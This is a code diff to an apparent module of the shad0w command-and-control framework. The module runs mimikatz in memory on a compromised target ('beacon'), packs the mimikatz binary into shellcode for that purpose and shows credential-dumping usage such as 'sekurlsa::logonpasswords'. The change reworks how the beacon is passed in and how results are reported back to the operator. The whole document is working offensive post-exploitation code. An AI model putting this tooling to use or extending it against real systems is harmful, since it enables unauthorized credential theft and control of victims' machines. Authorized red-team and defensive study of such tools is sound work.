@@ -9,6 +9,9 @@ from lib import shellcode
 __description__ = "Execute mimikatz commands in memory on the target"
 __author__ = "@_batsec_, @gentilkiwi"
 
+# beacon to exec command on
+current_beacon = None
+
 # identify the task as shellcode execute
 USERCD_EXEC_ID = 0x3000
 
@@ -38,16 +41,15 @@ def mimikatz_callback(shad0w, data):
     data = data.replace("'## v ##'", "\033[1;32m'##\033[0m \033[1;39mv\033[1;32m \033[1;32m##'\033[0m")
     data = data.replace("'#####'", "\033[1;32m'#####'\033[0m")
 
-    print(data)
+    shad0w.event.beacon_info(current_beacon, data)
 
     return ""
 
-def main(shad0w, args):
+def main(shad0w, args, beacon):
+    global current_beacon
 
-    # check we actually have a beacon
-    if shad0w.current_beacon is None:
-        shad0w.debug.log("ERROR: No active beacon", log=True)
-        return
+    # make beacon global
+    current_beacon = beacon
 
     # usage examples
     usage_examples = """
@@ -80,17 +82,17 @@ mimikatz -x sekurlsa::logonpasswords
 
     # show the errors to the user
     if not args.execute:
-        print(error_list) 
+        print(error_list)
         parse.print_help()
         return
-    
+
     if args.execute:
         params = ' '.join(args.execute)
 
         if not args.no_exit:
             params = params + " exit"
-        
-        # kinda a hack to make sure we intergrate nice with the shellcode generator 
+
+        # kinda a hack to make sure we intergrate nice with the shellcode generator
         args.param = args.execute
         args.cls = False
         args.method = False
@@ -98,6 +100,9 @@ mimikatz -x sekurlsa::logonpasswords
         args.appdomain = False
 
         b64_comp_data = shellcode.generate(MIMIKATZ_BIN, args, params)
-    
-    shad0w.beacons[shad0w.current_beacon]["task"] = (USERCD_EXEC_ID, b64_comp_data)
-    shad0w.beacons[shad0w.current_beacon]["callback"] = mimikatz_callback
+
+    # dont clear the callbacks, cause the responses are chunked
+    shad0w.clear_callbacks = False
+
+    shad0w.beacons[current_beacon]["task"] = (USERCD_EXEC_ID, b64_comp_data)
+    shad0w.beacons[current_beacon]["callback"] = mimikatz_callback
